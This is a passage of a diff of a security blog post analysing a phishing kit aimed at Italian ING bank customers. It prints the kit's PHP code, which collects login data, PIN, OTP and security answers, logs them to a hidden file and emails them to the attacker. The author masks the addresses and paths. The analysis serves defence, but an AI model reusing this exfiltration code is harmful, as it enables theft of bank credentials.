-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Reply-To: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-Type: text/plain; charset=utf-8</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mail</span>($my_email,$subject,$data,$headers);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$telefono</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require</span> <span class="s2">&#34;includes/my_email.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;Europe/London&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$time</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;m-d-Y g:i:a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$agent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;+ ------------------------------------------+</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;+ Dati Login per </span><span class="si">$username\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;+ ------------------------------------------+</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;| codcliente: &#34;</span><span class="o">.</span><span class="nv">$codclient</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;| giorno: &#34;</span><span class="o">.</span><span class="nv">$giorno</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;| mese: &#34;</span><span class="o">.</span><span class="nv">$mese</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;| anno: &#34;</span><span class="o">.</span><span class="nv">$anno</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">.=</span> <span class="s2">&#34;| telefono: &#34;</span><span class="o">.</span><span class="nv">$telefono</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$footer</span> <span class="o">=</span> <span class="s2">&#34;+ ------------------------------------------+</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$footer</span> <span class="o">.=</span> <span class="s2">&#34;+ Sent from </span><span class="si">$v_ip</span><span class="s2"> on </span><span class="si">$time</span><span class="s2"> via </span><span class="si">$agent\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$footer</span> <span class="o">.=</span> <span class="s2">&#34;+ ------------------------------------------+</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$msg</span> <span class="o">.</span> <span class="nv">$footer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_info&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;*********&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span> <span class="c1">// HIDING LOG FILE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;Poste Login Info for User: </span><span class="si">$username</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&#34;From: Poste Login Info &lt;</span><span class="si">$my_email</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Reply-To: Poste Login Info &lt;</span><span class="si">$my_email</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;MIME-Version: 1.0</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&#34;Content-Type: text/plain; charset=utf-8</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">mail</span><span class="p">(</span><span class="nv">$my_email</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$headers</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>After assigning the last bit of information coming from <code>login.php</code> (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from <code>includes/my_email.php</code> and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).</p>
 <p>Below you can find <code>my_email.php</code> (I have replaced the Gmail address with the asterisks):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$my_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;***********@gmail.com&#34;</span>; <span style="color:#75715e">//////// YOUR EMAIL GOES HERE
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$my_email</span> <span class="o">=</span> <span class="s2">&#34;***********@gmail.com&#34;</span><span class="p">;</span> <span class="c1">//////// YOUR EMAIL GOES HERE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>The comment <em>&ldquo;YOUR EMAIL GOES HERE&rdquo;</em> may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.</p>
 <p>Here is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Dati Login per
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>| codcliente: 1111111
-</span></span><span style="display:flex;"><span>| giorno: 11
-</span></span><span style="display:flex;"><span>| mese: 01
-</span></span><span style="display:flex;"><span>| anno: 1111
-</span></span><span style="display:flex;"><span>| telefono: 111111111111
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Dati Login per
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>| pin: 1111111
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Dati Login per
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>| otp: 1111111
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Dati Login per
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>| domanda1: 1111111
-</span></span><span style="display:flex;"><span>| domanda2: 1111111
-</span></span><span style="display:flex;"><span>| domanda3: 1111111
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
-</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Dati Login per
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">| codcliente: 1111111
+</span></span><span class="line"><span class="cl">| giorno: 11
+</span></span><span class="line"><span class="cl">| mese: 01
+</span></span><span class="line"><span class="cl">| anno: 1111
+</span></span><span class="line"><span class="cl">| telefono: 111111111111
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+</span></span><span class="line"><span class="cl">    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Dati Login per
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">| pin: 1111111
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+</span></span><span class="line"><span class="cl">    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Dati Login per
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">| otp: 1111111
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+</span></span><span class="line"><span class="cl">    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Dati Login per
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">| domanda1: 1111111
+</span></span><span class="line"><span class="cl">| domanda2: 1111111
+</span></span><span class="line"><span class="cl">| domanda3: 1111111
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
+</span></span><span class="line"><span class="cl">+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2)
+</span></span><span class="line"><span class="cl">    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span class="line"><span class="cl">+ ------------------------------------------+
 </span></span></code></pre></div><p>We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).</p>
-<h3 id="the-big-picture">The big picture</h3>
+<h3 id="the-big-picture">The big picture<a hidden class="anchor" aria-hidden="true" href="#the-big-picture">#</a></h3>
 <p>Based on the logs pasted previously, it&rsquo;s easy to have an idea of how the kit works:</p>
 <ol>
 <li><code>index.php</code> -&gt; check if the IP of the visitor is in a blacklist, if that&rsquo;s the case, redirect the connection to google.com</li>
@@ -376,18 +417,20 @@ The fields submitted to the form are:</p>
 <p>In this process, time has a crucial role, because OTP codes are valid only for some seconds (usually 60), thus the criminal either has an automatic agent to perform the login session with ING when the stolen credentials are received, or he/she will have to perform these actions manually and &ldquo;live&rdquo;.</p>
 <p>In addition, at every step, the PHP code will store the credentials obtained in the previous step in log file, e.g. the code in <code>pin.php</code> will write the credentials obtained during the execution of <code>login.php</code>.</p>
 <p>Below is a schema with the screenshots of the mentioned pages. I didn&rsquo;t include <code>index.php</code> because it does not have any graphical elements; instead I replaced the first step with a dialog in <code>login.php</code>, which tries to convince the user to enter the security details of his/her account.</p>
-<figure><img src="/images/posts/phishing-findings/ep3/diagram.png"
-         alt="Schema of the phishing kit"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/diagram.png#center"
+         alt="schema of the phishig kit targeting ING Bank customers"/> <figcaption>
             <p>Schema of the phishing kit</p>
         </figcaption>
 </figure>
 
 <p>It&rsquo;s interesting to note that the kit is performing some basic checks for some input fields (such as the birth date of the victim), but, in one of the final steps, it does not even specify which information should be entered in the form, indeed in <code>domande.php</code> we can only see some asterisks before the input field, which - in addition - accepts only numerical data.</p>
-<h2 id="conclusion">Conclusion</h2>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
 <p>In this post, we analyzed a phishing kit targeting Italian customers of ING bank.</p>
 <p>A lot of the code-base of the kit was imported from the original ING page without too much caring. Indeed, while inspecting the network connection, we can see that the kit is trying to reach out to the ING private APIs without receiving an answer (probably because the APIs are checking that the request is coming from an authorized source).</p>
-<figure><img src="/images/posts/phishing-findings/ep3/api.png"
-         alt="The kit tries to access to the Italian ING APIs"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/api.png#center"
+         alt="phishing kit of ING Bank trying to contact ING APIs"/> <figcaption>
             <p>The kit tries to access to the Italian ING APIs</p>
         </figcaption>
 </figure>
@@ -395,118 +438,148 @@ The fields submitted to the form are:</p>
 <p>The code includes a lot of comments and, in general, it seems that is still a work in progress; as a matter of fact, when it was online, it wasn&rsquo;t able to lure many victims.</p>
 <p>The ING kit shows how some criminals are trying to bypass Multi-Factor Authentication, by sending credentials (including OTP) via email as soon as these are stolen; and, probably in case they are not able to enter the OTP quick enough, they also try to steal the security questions, which are often used as a fallback mechanism to access the account.</p>
 
-      </div>
 
+  </div>
 
-      <footer>
-        
-
-
-        
-        
-        
-      </footer>
-    </article>
-
-    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [
-          ['$', '$'], ['\\(', '\\)']
-        ],
-        processEscapes: true,
-        processEnvironments: true
-      },
-      options: {
-        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
-      }
-    };
-  </script>
-  </section>
-
-	      </div>
-
-	<footer class="footer">
-
-<hr>
-
-    <section class="container">
-	
-	<p>If you have comments or suggestions, feel free to ping me!</p>
-	
-	
-	
-	
-
-
-<ul>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://andpalmier.com/tags/phishing/">phishing</a></li>
+      <li><a href="https://andpalmier.com/tags/phishingkit/">phishingkit</a></li>
+      <li><a href="https://andpalmier.com/tags/ingbank/">ingbank</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
     
-    
-    <li>
-	<a href="https://twitter.com/andpalmier/" aria-label="Twitter"  target="_blank" >
-	    <i class="fab fa-twitter" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://infosec.exchange/@andpalmier/" aria-label="Mastodon"  target="_blank" >
-	    <i class="fab fa-mastodon" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://github.com/andpalmier/" aria-label="Github"  target="_blank" >
-	    <i class="fab fa-github" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="https://www.linkedin.com/in/andpalmier/" aria-label="LinkedIn"  target="_blank" >
-	    <i class="fab fa-linkedin" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-    <li>
-	<a href="mailto:andpalmier@gmail.com" aria-label="Mail"  target="_blank" >
-	    <i class="fas fa-envelope" aria-hidden="true"></i>
-	</a>
-    </li>
-    
-    
-    
-</ul>
-
-    </section>
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://andpalmier.com">andpalmier</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
 </footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    scrollOffset: 40,  
+    container: null,  
+    template: null,  
+    background: 'rgba(0, 0, 0, 0.8)'
+  });
+});
+</script>
 
 
-	  </main>
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
 
-    
-      
-        
-        <script src="/js/dark-mode.min.c2d8a1f8f2660e4a46d776277c72695a1e0ca65939d79f754441d47551604af5.js"></script>
-      
-    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
 
-	  
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
 
-	  
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
 
-	  
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
 
-    </body>
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
 
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
 
 </html>
